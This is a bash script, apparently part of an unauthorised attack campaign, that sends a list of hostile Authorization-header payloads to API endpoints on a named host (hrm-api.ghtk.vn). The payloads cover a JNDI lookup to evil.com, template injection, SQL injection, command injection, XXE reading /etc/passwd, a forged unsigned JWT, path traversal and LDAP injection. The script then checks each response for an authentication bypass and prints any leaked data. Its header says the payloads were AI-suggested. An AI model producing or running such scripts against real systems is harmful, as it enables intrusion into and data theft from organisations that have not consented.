#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 v13.0 Authorization头注入攻击（AI建议）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "[*] AI发现: .htaccess会传递Authorization头到环境变量"
echo "[*] 可能存在: Authorization头注入/认证绕过"
echo ""

TARGET="hrm-api.ghtk.vn"

# AI生成的Authorization头变体
AUTH_PAYLOADS=(
    # 空值绕过
    "Bearer"
    "Bearer "
    "Bearer null"
    "Bearer undefined"
    
    # 特殊字符注入
    "Bearer \${jndi:ldap://evil.com}"
    "Bearer {{7*7}}"
    "Bearer <%= 7*7 %>"
    
    # SQL注入
    "Bearer ' OR '1'='1"
    "Bearer admin'--"
    
    # 命令注入
    "Bearer \$(whoami)"
    "Bearer ;whoami;"
    "Bearer |whoami"
    
    # XXE
    "Bearer <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>"
    
    # JWT伪造
    "Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ."
    
    # 路径穿越
    "Bearer ../../../etc/passwd"
    
    # LDAP注入
    "Bearer *)(uid=*))(|(uid=*"
)

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[*] 测试高价值API端点..."
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""

APIS=(
    "/api/user/info"
    "/api/admin/users"
    "/"
)

for api in "${APIS[@]}"; do
    echo "━━━ 测试API: $api ━━━"
    
    for payload in "${AUTH_PAYLOADS[@]}"; do
        echo -n "  Authorization: $payload → "
        
        resp=$(curl -sk "https://$TARGET$api" \
            -H "Authorization: $payload" \
            -m 2 -w "%{http_code}" -o /tmp/auth_test 2>&1)
        
        if [ "$resp" == "200" ]; then
            # 检查是否绕过认证
            if jq -e '.data' /tmp/auth_test >/dev/null 2>&1; then
                echo "✅✅✅ 认证绕过！返回数据！"
                cat /tmp/auth_test | jq .
                break 2
            elif grep -qi "welcome\|dashboard\|admin" /tmp/auth_test 2>/dev/null; then
                echo "⚠️  可能绕过！"
                head -10 /tmp/auth_test
            else
                echo "❌"
            fi
        else
            echo "❌ ($resp)"
        fi
    done
    echo ""
done

